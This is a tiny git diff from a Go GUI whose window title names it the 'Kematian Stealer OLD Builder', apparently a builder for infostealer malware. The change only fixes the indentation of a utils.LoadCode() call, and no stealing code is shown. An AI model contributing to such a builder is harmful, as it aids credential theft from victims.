@@ -22,7 +22,7 @@ func main() {
 	win := a.NewWindow(cursed.Generate("Kematian Stealer OLD Builder", "normal", true, true, true))
 	win.Resize(fyne.NewSize(500, 400))
 	win.CenterOnScreen()
-        utils.LoadCode()
+	utils.LoadCode()
 	if !autoUpdate.AutoUpdate() {
 		utils.MakeSuccessMessage(a, "A NEW UPDATE IS AVAILABLE! PLEASE DOWNLOAD IT FROM THE GITHUB REPO!")
 	}
